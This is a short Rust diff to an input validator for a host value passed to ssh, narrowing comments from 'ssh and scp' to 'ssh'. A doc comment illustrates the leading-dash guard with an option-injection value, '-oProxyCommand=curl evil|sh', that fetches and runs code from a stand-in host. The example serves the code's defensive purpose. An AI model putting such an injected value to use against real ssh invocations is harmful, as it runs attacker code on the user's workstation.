@@ -111,16 +111,14 @@ impl From<FieldError> for HostProblem {
 /// `super::guards`, so widening one there widens it here too.
 ///
 /// The leading-dash rule is the one worth spelling out. `host`
-/// reaches `ssh` and `scp` as their first positional argument,
-/// and neither honours a `--` end-of-options separator, so a
+/// reaches `ssh` as its first positional argument, and `ssh`
+/// does not honour a `--` end-of-options separator, so a
 /// leading `-` is read as an option:
 /// `-oProxyCommand=curl evil|sh` runs code on this workstation
 /// from a bare `bombyx status`, before any network traffic.
 pub(crate) fn host_problem(value: &str) -> Option<HostProblem> {
     guards::check_not_empty("host", value)
-        .and_then(|()| {
-            guards::check_not_an_option("host", value, "ssh and scp")
-        })
+        .and_then(|()| guards::check_not_an_option("host", value, "ssh"))
         .and_then(|()| {
             guards::check_charset(
                 "host",
@@ -208,7 +206,7 @@ where
     //
     // Such a value arrives from a per-directory environment
     // (`direnv`, a `mise.toml` in a clone, a CI job) or a plain
-    // typo, and the host it supplies decides where `up` scps an
+    // typo, and the host it supplies decides where `up` boots a
     // archive and where `destroy` runs `rm -rf`.
     let set = |key: &str| {
         var(key)
